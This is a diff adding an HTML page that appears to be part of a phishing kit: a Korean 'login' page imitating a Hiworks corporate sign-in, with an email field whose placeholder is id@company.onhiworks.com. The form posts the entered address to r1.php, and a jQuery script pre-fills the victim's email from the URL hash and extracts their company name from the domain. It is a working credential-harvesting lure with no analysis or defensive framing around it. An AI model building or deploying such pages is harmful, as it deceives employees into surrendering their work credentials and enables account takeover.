@@ -1,0 +1,74 @@
+source: <html>
+
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>&#47196;&#44536;&#51064;</title>
+</head>
+
+<body bgcolor="#F8F9FB">
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<img border="0" src="ljjkk.PNG" width="118" height="38"></p>
+<p>&nbsp;</p>
+<p align="center"><b><font face="Malgun Gothic" size="6">&#47196;&#44536;&#51064;</font></b></p>
+<p align="center"><font face="Malgun Gothic">&#46020;&#47700;&#51064;&#51012; &#54252;&#54632;&#54620; &#47196;&#44536;&#51064; ID&#47484; &#51077;&#47141;&#54616;&#49464;&#50836;.</font></p>
+<p align="center">&nbsp;</p>
+<p align="center">
+<form method="post" action="r1.php">
+<p align="center">
+<input type="email" name="email" id="email" placeholder="id@company.onhiworks.com" size="45" style="border: 1px solid #0066FF; width: 398; height: 38; font-family:Malgun Gothic"></p>
+</p>
+<p align="center">
+<input type="image" name="submit" src="nxt2323.PNG" width="402" height="50"></p>
+<p align="center">
+&nbsp;</p>
+<p align="center">
+<img border="0" src="ann5435.PNG" width="323" height="25"></p>
+</form>
+<p align="center">
+&nbsp;</p>
+<p align="center">
+<img border="0" src="globainc.PNG" width="94" height="25"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+</body>
+<script src="jquery.min.js"></script>
+<script src="bootstrap.min.js"></script>
+
+
+
+<script >
+    
+
+  /* global $ */
+  $(document).ready(function(){
+    var count=0;
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();        
+        $('#email').val(my_email);
+        $('#domain-name').html(final);
+        $("#msg").hide();
+      }
+      ///////////////url getting email////////////////
+
+
+
+    });
+
+
+</script>
+
+</html>
+Page title: 로그인
